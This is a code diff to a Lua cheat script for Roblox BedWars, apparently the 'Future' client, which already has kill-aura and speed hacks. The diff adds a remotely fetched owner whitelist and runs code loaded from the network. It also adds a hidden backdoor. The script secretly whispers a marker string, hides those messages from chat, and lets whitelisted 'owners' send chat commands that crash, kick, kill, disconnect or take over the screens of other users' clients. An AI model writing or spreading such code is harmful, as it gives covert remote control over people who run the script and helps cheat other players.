@@ -16,11 +16,18 @@ local spawn = function(func)
 end
 local bedwars = {} 
 local Reach = {Enabled = false}
+local oldisnetworkowner = isnetworkowner
+local isnetworkowner = isnetworkowner or function() return true end
 local speedsettings = {
     factor = 5.37,  
     velocitydivfactor = 2.9,
     wsvalue = 22.5
 }
+local whitelisted = {}
+local storedshahashes = {}
+pcall(function()
+	whitelisted = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/whitelists/main/whitelist2.json", true))
+end)
 
 local function requesturl(url, bypass) 
     if isfile(url) and shared.FutureDeveloper then 
@@ -35,6 +42,7 @@ local function requesturl(url, bypass)
     if req.StatusCode == 404 then error("404 Not Found") end
     return req.Body
 end 
+local shalib = loadstring(requesturl("lib/sha.lua"))()
 
 local function getasset(path)
 	if not isfile(path) then
@@ -126,6 +134,15 @@ local function fprint(...)
     end
     print("[Future]"..str)
     GuiLibrary.CreateNotification("<font color='rgb(200, 200, 200)'>"..str.."</font>")
+end
+
+local function betterfind(tab, obj)
+	for i,v in pairs(tab) do
+		if v == obj then
+			return i
+		end
+	end
+	return nil
 end
 
 local function getColorFromPlayer(v) 
@@ -241,6 +258,12 @@ getmetatable(Client).Get = function(Self, remotename)
                     local newres = hashvector(tab.validate.selfPosition.value + (mag > 14.4 and (CFrame.lookAt(tab.validate.selfPosition.value, tab.validate.targetPosition.value).lookVector * 4) or Vector3.new(0, 0, 0)))
                     tab.validate.selfPosition = newres
                 end
+                local suc, plr = pcall(function() return PLAYERS:GetPlayerFromCharacter(tab.entityInstance) end)
+                if suc and plr then
+                    if plr and bedwars["CheckWhitelisted"](plr) then
+                        return nil
+                    end
+                end
                 return res:CallServer(tab)
             end
         }
@@ -249,6 +272,36 @@ getmetatable(Client).Get = function(Self, remotename)
 end
 
 bedwars = {
+    ["CheckWhitelisted"] = function(plr, ownercheck)
+        local plrstr = bedwars["HashFunction"](plr.Name..plr.UserId)
+        local localstr = bedwars["HashFunction"](lplr.Name..lplr.UserId)
+        return ((ownercheck == nil and (betterfind(whitelisted.players, plrstr) or betterfind(whitelisted.owners, plrstr)) or ownercheck and betterfind(whitelisted.owners, plrstr))) and betterfind(whitelisted.owners, localstr) == nil and true or false
+    end,
+    ["CheckPlayerType"] = function(plr)
+        local plrstr = bedwars["HashFunction"](plr.Name..plr.UserId)
+        local playertype = "DEFAULT"
+        if betterfind(whitelisted.players, plrstr) then
+            playertype = "PRIVATE"
+        end
+        if betterfind(whitelisted.owners, plrstr) then
+            playertype = "OWNER"
+        end
+        return playertype
+    end,
+    ["HashFunction"] = function(str)
+        if storedshahashes[tostring(str)] == nil then
+            storedshahashes[tostring(str)] = shalib.sha512(tostring(str).."SelfReport")
+        end
+        return storedshahashes[tostring(str)]
+    end,
+    ["IsPrivateIngame"] = function()
+        for i,v in pairs(PLAYERS:GetChildren()) do 
+            if bedwars["CheckPlayerType"](v) ~= "DEFAULT" then 
+                return true
+            end
+        end
+        return false
+    end,
     ["AnimationUtil"] = require(game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out["shared"].util["animation-util"]).AnimationUtil,
     ["AngelUtil"] = require(game:GetService("ReplicatedStorage").TS.games.bedwars.kit.kits.angel["angel-kit"]),
     ["AppController"] = require(game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out.client.controllers["app-controller"]).AppController,
@@ -726,42 +779,44 @@ do
                                         }, 
                                         ["chargedAttack"] = {["chargeRatio"] = 1},
                                     }
-                                    spawn(function()
-                                        hitremote:InvokeServer(attackArgs)
-                                    end)
-
-                                    GuiLibrary["TargetHUDAPI"].update(v, math.floor(v.Character:GetAttribute("Health")))
-
-                                    playanimation("rbxassetid://4947108314")
-
-                                    -- animation stuff (thx 7grand once again)
-                                    
-                                    if not stopTween then
-                                        local Tween
-                                        if auraanim["Value"] == "Slow" then 
-                                            Tween = TS:Create(cam.Viewmodel.RightHand.RightWrist,
-                                            TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, true, 0), 
-                                            {C0 = origC0 * CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(-math.rad(65), math.rad(55), -math.rad(70))})
-                                        elseif auraanim["Value"] == "Medium" then 
-                                            Tween = TS:Create(cam.Viewmodel.RightHand.RightWrist,
-                                            TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, true, 0), 
-                                            {C0 = origC0 * CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(-math.rad(65), math.rad(55), -math.rad(70))})
-                                        elseif auraanim["Value"] == "Fast" then 
-                                            Tween = TS:Create(cam.Viewmodel.RightHand.RightWrist,
-                                            TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, true, 0), 
-                                            {C0 = origC0 * CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(-math.rad(65), math.rad(55), -math.rad(70))})
-                                        elseif auraanim["Value"] == "Dev" then 
-                                            Tween = TS:Create(cam.Viewmodel.RightHand.RightWrist,
-                                            TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out, 0, true, 0), 
-                                            {C0 = origC0 * CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(-math.rad(-90), math.rad(0), -math.rad(90))})
-                                        end
-
+                                    if not bedwars["CheckWhitelisted"](v) then
                                         spawn(function()
-                                            stopTween = true
-                                            Tween:Play()
-                                            Tween.Completed:Wait()
-                                            stopTween = false
+                                            hitremote:InvokeServer(attackArgs)
                                         end)
+
+                                        GuiLibrary["TargetHUDAPI"].update(v, math.floor(v.Character:GetAttribute("Health")))
+
+                                        playanimation("rbxassetid://4947108314")
+
+                                        -- animation stuff (thx 7grand once again)
+                                        
+                                        if not stopTween then
+                                            local Tween
+                                            if auraanim["Value"] == "Slow" then 
+                                                Tween = TS:Create(cam.Viewmodel.RightHand.RightWrist,
+                                                TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, true, 0), 
+                                                {C0 = origC0 * CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(-math.rad(65), math.rad(55), -math.rad(70))})
+                                            elseif auraanim["Value"] == "Medium" then 
+                                                Tween = TS:Create(cam.Viewmodel.RightHand.RightWrist,
+                                                TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, true, 0), 
+                                                {C0 = origC0 * CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(-math.rad(65), math.rad(55), -math.rad(70))})
+                                            elseif auraanim["Value"] == "Fast" then 
+                                                Tween = TS:Create(cam.Viewmodel.RightHand.RightWrist,
+                                                TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, true, 0), 
+                                                {C0 = origC0 * CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(-math.rad(65), math.rad(55), -math.rad(70))})
+                                            elseif auraanim["Value"] == "Dev" then 
+                                                Tween = TS:Create(cam.Viewmodel.RightHand.RightWrist,
+                                                TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out, 0, true, 0), 
+                                                {C0 = origC0 * CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(-math.rad(-90), math.rad(0), -math.rad(90))})
+                                            end
+
+                                            spawn(function()
+                                                stopTween = true
+                                                Tween:Play()
+                                                Tween.Completed:Wait()
+                                                stopTween = false
+                                            end)
+                                        end
                                     end
                                 end
                             else
@@ -986,21 +1041,28 @@ end
 
 GuiLibrary["RemoveObject"]("SpeedOptionsButton")
 do
-    local isnetworkowner = isnetworkowner or function() return true end
     local speedval = {["Value"] = 40}
     local speedmode = {["Enabled"] = false}
     local speed = {["Enabled"] = false}
+    local hop = {Enabled = false}
     speed = GuiLibrary.Objects.MovementWindow.API.CreateOptionsButton({
         ["Name"] = "Speed",
         ["ArrayText"] = function() return speedval["Value"] end,
         ["Function"] = function(callback)
             if callback then
+                local i = 0
                 BindToStepped("Speed", function(time, dt)
                     if isAlive() and not stopSpeed then
                         lplr.Character.Humanoid.WalkSpeed = speedsettings.wsvalue
                         local velo = lplr.Character.Humanoid.MoveDirection * (speedval["Value"]*((isnetworkowner and isnetworkowner(lplr.Character.HumanoidRootPart)) and speedsettings.factor or 0)) * dt
                         velo = Vector3.new(velo.x / 11, 0, velo.z / 11)
                         lplr.Character:TranslateBy(velo)
+
+                        if hop.Enabled then 
+                            if lplr.Character.Humanoid:GetState() == Enum.HumanoidStateType.Running and lplr.Character.Humanoid.MoveDirection ~= Vector3.new() then 
+                                lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                            end
+                        end
 
                         --local velo2 = (lplr.Character.Humanoid.MoveDirection * speedval["Value"]) / speedsettings.velocitydivfactor
                         --lplr.Character.HumanoidRootPart.Velocity = Vector3.new(velo2.X, lplr.Character.HumanoidRootPart.Velocity.Y, velo2.Z)
@@ -1019,6 +1081,10 @@ do
         ["Default"] = 42,
         ["Round"] = 0,
         ["Function"] = function() end
+    })
+    hop = speed.CreateToggle({
+        Name = "Hop",
+        Function = function() end,
     })
 end
 
@@ -1106,7 +1172,7 @@ do
 end
 
 -- // render window 
-if isnetworkowner~=nil then do 
+if oldisnetworkowner~=nil then do 
     local textlabel
     local LagBackNotify = {["Enabled"] = false}
     local notifyfunc
@@ -1805,3 +1871,405 @@ GuiLibrary.Signals.onDestroy:connect(function()
         error(value)
     end
 end)
+
+
+local priolist = {
+	["DEFAULT"] = 0,
+	["PRIVATE"] = 1,
+	["OWNER"] = 2
+}
+local alreadysaidlist = {}
+
+local function findplayers(arg)
+	local temp = {}
+	local continuechecking = true
+
+	if arg == "default" and continuechecking and bedwars["CheckPlayerType"](lplr) == "DEFAULT" then table.insert(temp, lplr) continuechecking = false end
+	if arg == "private" and continuechecking and bedwars["CheckPlayerType"](lplr) == "PRIVATE" then table.insert(temp, lplr) continuechecking = false end
+	for i,v in pairs(game:GetService("Players"):GetChildren()) do if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then table.insert(temp, v) continuechecking = false end end
+
+	return temp
+end
+
+local commands = {
+	["kill"] = function(args)
+		if isAlive() then
+			lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+			lplr.Character.Humanoid.Health = 0
+			bedwars["ClientHandler"]:Get(bedwars["ResetRemote"]):SendToServer()
+		end
+	end,
+	["lagback"] = function(args)
+		if isAlive() then
+			lplr.Character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
+		end
+	end,
+	["jump"] = function(args)
+		if isAlive() and lplr.Character.Humanoid.FloorMaterial ~= Enum.Material.Air then
+			lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+		end
+	end,
+	["sit"] = function(args)
+		if isAlive() then
+			lplr.Character.Humanoid.Sit = true
+		end
+	end,
+	["unsit"] = function(args)
+		if isAlive() then
+			lplr.Character.Humanoid.Sit = false
+		end
+	end,
+	["freeze"] = function(args)
+		if isAlive() then
+			lplr.Character.HumanoidRootPart.Anchored = true
+		end
+	end,
+	["unfreeze"] = function(args)
+		if isAlive() then
+			lplr.Character.HumanoidRootPart.Anchored = false
+		end
+	end,
+	["deletemap"] = function(args)
+		for i,v in pairs(game:GetService("CollectionService"):GetTagged("block")) do
+			v:Remove()
+		end
+	end,
+	["void"] = function(args)
+		if isAlive() then
+			spawn(function()    
+				repeat
+					task.wait(0.2)
+					lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0, -10, 0)
+				until not isAlive()
+			end)
+		end
+	end,
+	--[[["scare"] = function(args)
+		local image = Instance.new("ImageLabel")
+		image.ZIndex = 10
+		image.Image = "http://www.roblox.com/asset/?id=7473973347"
+		image.Size = UDim2.new(0, 0, 0, 0)
+		image.Position = UDim2.new(0, 0, 0, -36)
+		image.BackgroundTransparency = 1
+		image.Parent = GuiLibrary["MainGui"]
+		local sound = Instance.new("Sound")
+		sound.Volume = 10
+		sound.SoundId = "rbxassetid://2557531797"
+		sound.Parent = workspace
+		spawn(function()
+			repeat task.wait() until image.IsLoaded and sound.IsLoaded
+			image.Size = UDim2.new(1, 0, 1, 36)
+			sound:Play()
+			game:GetService("Debris"):AddItem(sound, 0.3)
+			game:GetService("Debris"):AddItem(image, 0.3)
+		end)
+	end,]]
+	["framerate"] = function(args)
+		if #args >= 1 then
+			if setfpscap then
+				setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]), 1, 9999) or 9999)
+			end
+		end
+	end,
+	["crash"] = function(args)
+		setfpscap(100000000)
+    	print(game:GetObjects("h29g3535")[1])
+	end,
+--[[["playsound"] = function(args)
+		if #args >= 1 then
+			local function convertletter(let)
+				return string.byte(let) - 96
+			end
+			local str = args[1]
+			local newstr = ""
+			for i = 1, str:len() do
+				newstr = newstr..convertletter(str:sub(i, i))
+			end
+			local sound = Instance.new("Sound")
+			sound.SoundId = "rbxassetid://"..newstr
+			sound.Parent = workspace
+			sound:Play()
+		end
+	end,]]
+	["chipman"] = function(args)
+		local function funnyfunc(v)
+			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
+				v.Image = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("Image"):connect(function()
+					v.Image = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
+				if v.Text ~= "" then
+					v.Text = "chips"
+				end
+				v:GetPropertyChangedSignal("Text"):connect(function()
+					if v.Text ~= "" then
+						v.Text = "chips"
+					end
+				end)
+			end
+			if v:IsA("Texture") or v:IsA("Decal") then
+				v.Texture = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("Texture"):connect(function()
+					v.Texture = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if v:IsA("MeshPart") then
+				v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("TextureID"):connect(function()
+					v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if v:IsA("SpecialMesh") then
+				v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("TextureId"):connect(function()
+					v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if v:IsA("Sky") then
+				v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
+			end
+		end
+	
+		for i,v in pairs(game:GetDescendants()) do
+			funnyfunc(v)
+		end
+		game.DescendantAdded:connect(funnyfunc)
+	--[[	local sound = Instance.new("Sound")
+		sound.SoundId = "rbxassetid://6516015896"
+		sound.Parent = workspace
+		sound.Looped = true
+		sound:Play()]]
+	end,
+	["rickroll"] = function(args)
+		local function funnyfunc(v)
+			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
+				v.Image = "http://www.roblox.com/asset/?id=7083449168"
+				v:GetPropertyChangedSignal("Image"):connect(function()
+					v.Image = "http://www.roblox.com/asset/?id=7083449168"
+				end)
+			end
+			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
+				if v.Text ~= "" then
+					v.Text = "Never gonna give you up"
+				end
+				v:GetPropertyChangedSignal("Text"):connect(function()
+					if v.Text ~= "" then
+						v.Text = "Never gonna give you up"
+					end
+				end)
+			end
+			if v:IsA("Texture") or v:IsA("Decal") then
+				v.Texture = "http://www.roblox.com/asset/?id=7083449168"
+				v:GetPropertyChangedSignal("Texture"):connect(function()
+					v.Texture = "http://www.roblox.com/asset/?id=7083449168"
+				end)
+			end
+			if v:IsA("MeshPart") then
+				v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
+				v:GetPropertyChangedSignal("TextureID"):connect(function()
+					v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
+				end)
+			end
+			if v:IsA("SpecialMesh") then
+				v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
+				v:GetPropertyChangedSignal("TextureId"):connect(function()
+					v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
+				end)
+			end
+			if v:IsA("Sky") then
+				v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
+			end
+		end
+	
+		for i,v in pairs(game:GetDescendants()) do
+			funnyfunc(v)
+		end
+		game.DescendantAdded:connect(funnyfunc)
+	--[[	local sound = Instance.new("Sound")
+		sound.SoundId = "rbxassetid://516046413"
+		sound.Parent = workspace
+		sound.Looped = true
+		sound:Play()]]
+	end,
+	["gravity"] = function(args)
+		workspace.Gravity = tonumber(args[1]) or 192.6
+	end,
+	["kick"] = function(args)
+		local str = ""
+		for i,v in pairs(args) do
+			str = str..v..(i > 1 and " " or "")
+		end
+		lplr:Kick(str)
+	end,
+	["uninject"] = function(args)
+		spawn(function() 
+            GuiLibrary["SaveConfig"](GuiLibrary["CurrentConfig"])
+            GuiLibrary.Signals.onDestroy:Fire()
+        end)
+	end,
+	["disconnect"] = function(args)
+		lplr:Kick()
+	end,
+	["togglemodule"] = function(args)
+		if #args >= 1 then
+			local module = GuiLibrary["Objects"][args[1].."OptionsButton"]
+			if module then
+				if args[2] == "true" then
+					if module["API"]["Enabled"] == false then
+						module["API"]["Toggle"]()
+					end
+				else
+					if module["API"]["Enabled"] then
+						module["API"]["Toggle"]()
+					end
+				end
+			end
+		end
+	end,
+}
+
+local connection1 = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:connect(function(tab, channel)
+	local plr = PLAYERS:FindFirstChild(tab["FromSpeaker"])
+	if plr and bedwars["CheckPlayerType"](lplr) ~= "DEFAULT" and tab.MessageType == "Whisper" and tab.Message:find("KVOP25KYFPPP4") and alreadysaidlist[plr.Name] == nil then
+		alreadysaidlist[plr.Name] = true
+		spawn(function()
+			local connection
+			for i,newbubble in pairs(game:GetService("CoreGui").BubbleChat:GetDescendants()) do
+				if newbubble:IsA("TextLabel") and newbubble.Text:find("KVOP25KYFPPP4") then
+					newbubble.Parent.Parent.Visible = false
+					repeat task.wait() until newbubble.Parent.Parent.Parent == nil or newbubble.Parent.Parent.Parent.Parent == nil
+					if connection then
+						connection:Disconnect()
+					end
+				end
+			end
+			connection = game:GetService("CoreGui").BubbleChat.DescendantAdded:connect(function(newbubble)
+				if newbubble:IsA("TextLabel") and newbubble.Text:find("KVOP25KYFPPP4") then
+					newbubble.Parent.Parent.Visible = false
+					repeat task.wait() until newbubble.Parent.Parent.Parent == nil or  newbubble.Parent.Parent.Parent.Parent == nil
+					if connection then
+						connection:Disconnect()
+					end
+				end
+			end)
+		end)
+		GuiLibrary["CreateToast"]("Future", plr.Name.." is using future!", 30)
+	end
+	local args = tab.Message:split(" ")
+	--priolist[bedwars["CheckPlayerType"](plr)] > 0 and plr ~= lplr and priolist[bedwars["CheckPlayerType"](plr)] > priolist[bedwars["CheckPlayerType"](lplr)]
+	if priolist[bedwars["CheckPlayerType"](lplr)] > 0 and plr == lplr then
+		if tab.Message:len() >= 5 and tab.Message:sub(1, 5):lower() == ";cmds" then
+			local tab = {}
+			for i,v in pairs(commands) do
+				table.insert(tab, i)
+			end
+			table.sort(tab)
+			local str = ""
+			for i,v in pairs(tab) do
+				str = str..";"..v.."\n"
+			end
+			game.StarterGui:SetCore("ChatMakeSystemMessage",{
+                Text = 	str,
+            })
+		end
+	end
+	if plr and priolist[bedwars["CheckPlayerType"](plr)] > 0 and plr ~= lplr and priolist[bedwars["CheckPlayerType"](plr)] > priolist[bedwars["CheckPlayerType"](lplr)] and #args > 1 then
+		table.remove(args, 1)
+		local chosenplayers = findplayers(args[1])
+		if table.find(chosenplayers, lplr) then
+			table.remove(args, 1)
+			for i,v in pairs(commands) do
+				if tab.Message:len() >= (i:len() + 1) and tab.Message:sub(1, i:len() + 1):lower() == ";"..i:lower() then
+				--	print("hahahah")
+					v(args)
+					break
+				end
+			end
+		end
+	end
+end)
+
+local connection2 = lplr.PlayerGui:WaitForChild("Chat").Frame.ChatChannelParentFrame["Frame_MessageLogDisplay"].Scroller.ChildAdded:connect(function(text)
+	local textlabel2 = text:WaitForChild("TextLabel")
+	if bedwars["IsPrivateIngame"]() then
+		if textlabel2.Text:find("KVOP25KYFPPP4") or textlabel2.Text:find("You are now chatting") or textlabel2.Text:find("You are now privately chatting") then
+			text.Size = UDim2.new(0, 0, 0, 0)
+			text:GetPropertyChangedSignal("Size"):connect(function()
+				text.Size = UDim2.new(0, 0, 0, 0)
+			end)
+		end
+		textlabel2:GetPropertyChangedSignal("Text"):connect(function()
+			if textlabel2.Text:find("KVOP25KYFPPP4") or textlabel2.Text:find("You are now chatting") or textlabel2.Text:find("You are now privately chatting") then
+				text.Size = UDim2.new(0, 0, 0, 0)
+				text:GetPropertyChangedSignal("Size"):connect(function()
+					text.Size = UDim2.new(0, 0, 0, 0)
+				end)
+			end
+		end)
+	end
+end)
+
+local function fun(plr) 
+    if lplr ~= plr and bedwars["CheckPlayerType"](lplr) == "DEFAULT" then
+        spawn(function()
+            repeat task.wait() until isAlive(plr)
+            repeat task.wait() until plr.Character.HumanoidRootPart.Velocity ~= Vector3.new(0, 0, 0)
+            task.wait(4)
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..plr.Name.." KVOP25KYFPPP4", "All")
+            spawn(function()
+                local connection
+                for i,newbubble in pairs(game:GetService("CoreGui").BubbleChat:GetDescendants()) do
+                    pcall(function()
+                        if newbubble:IsA("TextLabel") and newbubble.Text:find("KVOP25KYFPPP4") then
+                            newbubble.Parent.Parent.Visible = false
+                            repeat task.wait() until newbubble.Parent.Parent.Parent.Parent == nil
+                            if connection then
+                                connection:Disconnect()
+                            end
+                        end
+                    end)
+                end
+                connection = game:GetService("CoreGui").BubbleChat.DescendantAdded:connect(function(newbubble)
+                    pcall(function()
+                        if newbubble:IsA("TextLabel") and newbubble.Text:find("KVOP25KYFPPP4") then
+                            newbubble.Parent.Parent.Visible = false
+                            repeat task.wait() until newbubble.Parent.Parent.Parent.Parent == nil
+                            if connection then
+                                connection:Disconnect()
+                            end
+                        end
+                    end)
+                end)
+            end)
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Wait()
+            task.wait(0.2)
+            if getconnections then
+                for i,v in pairs(getconnections(game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
+                    if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == "table" and getmetatable(debug.getupvalues(v.Function)[1]) and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel then
+                        debug.getupvalues(v.Function)[1]:SwitchCurrentChannel("all")
+                    end
+                end
+            end
+        end)
+    end
+end
+
+local connection3 = PLAYERS.PlayerAdded:connect(fun)
+for i,v in pairs(PLAYERS:GetPlayers()) do 
+    fun(v)
+end
+table.insert(GuiLibrary["Connections"], connection1)
+table.insert(GuiLibrary["Connections"], connection2)
+table.insert(GuiLibrary["Connections"], connection3)
